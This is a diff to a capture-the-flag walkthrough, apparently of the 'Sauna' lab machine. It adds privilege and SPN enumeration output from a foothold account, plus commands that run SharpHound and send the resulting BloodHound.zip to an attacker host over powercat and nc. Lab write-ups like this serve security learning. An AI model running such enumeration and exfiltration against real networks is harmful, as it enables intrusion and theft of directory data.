@@ -75,11 +75,69 @@ Discovered [go-windapsearch](https://github.com/ropnop/go-windapsearch) to autom
 
 ![user](Screenshots/user-txt.png)
 
-I then use `evil-winrm upload` for SharpHound.zip then 
+```batch
+C:\Users\FSmith\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+C:\Users\FSmith\Documents> setspn -T EGOTISTICAL-BANK.LOCAL -Q */*
+Checking domain DC=EGOTISTICAL-BANK,DC=LOCAL
+CN=SAUNA,OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
+        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/SAUNA.EGOTISTICAL-BANK.LOCAL
+        ldap/SAUNA.EGOTISTICAL-BANK.LOCAL/ForestDnsZones.EGOTISTICAL-BANK.LOCAL
+        ldap/SAUNA.EGOTISTICAL-BANK.LOCAL/DomainDnsZones.EGOTISTICAL-BANK.LOCAL
+        DNS/SAUNA.EGOTISTICAL-BANK.LOCAL
+        GC/SAUNA.EGOTISTICAL-BANK.LOCAL/EGOTISTICAL-BANK.LOCAL
+        RestrictedKrbHost/SAUNA.EGOTISTICAL-BANK.LOCAL
+        RestrictedKrbHost/SAUNA
+        RPC/b3e0be40-25c6-44ec-b2b9-9ff85c44b2ec._msdcs.EGOTISTICAL-BANK.LOCAL
+        HOST/SAUNA/EGOTISTICALBANK
+        HOST/SAUNA.EGOTISTICAL-BANK.LOCAL/EGOTISTICALBANK
+        HOST/SAUNA
+        HOST/SAUNA.EGOTISTICAL-BANK.LOCAL
+        HOST/SAUNA.EGOTISTICAL-BANK.LOCAL/EGOTISTICAL-BANK.LOCAL
+        E3514235-4B06-11D1-AB04-00C04FC2DCD2/b3e0be40-25c6-44ec-b2b9-9ff85c44b2ec/EGOTISTICAL-BANK.LOCAL
+        ldap/SAUNA/EGOTISTICALBANK
+        ldap/b3e0be40-25c6-44ec-b2b9-9ff85c44b2ec._msdcs.EGOTISTICAL-BANK.LOCAL
+        ldap/SAUNA.EGOTISTICAL-BANK.LOCAL/EGOTISTICALBANK
+        ldap/SAUNA
+        ldap/SAUNA.EGOTISTICAL-BANK.LOCAL
+        ldap/SAUNA.EGOTISTICAL-BANK.LOCAL/EGOTISTICAL-BANK.LOCAL
+CN=krbtgt,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
+        kadmin/changepw
+CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
+        SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111
+
+Existing SPN found!
+
+```
+
+```batch
+
+usncreated              : 40976
+displayname             : Block downloads to powershell
+```
+
+I then use `evil-winrm upload` for SharpHound.zip and powercat 
 ```powershell
 powershell -c "Expand-Archive SharpHound.zip SharpHound
 SharpHound.exe -c all
+# Attacking machine:
+nc -lvnp 54321 > Bloodhound.zip
+# Windows
+powercat -c 10.10.10.10 -p 54321 -i C:\Users\FSmith\Documents\SharpHound\BloodHound.zip
 ```
+
+![](Screenshots/dcsync-bh.png)
+
+
 
 
 ## PrivEsc
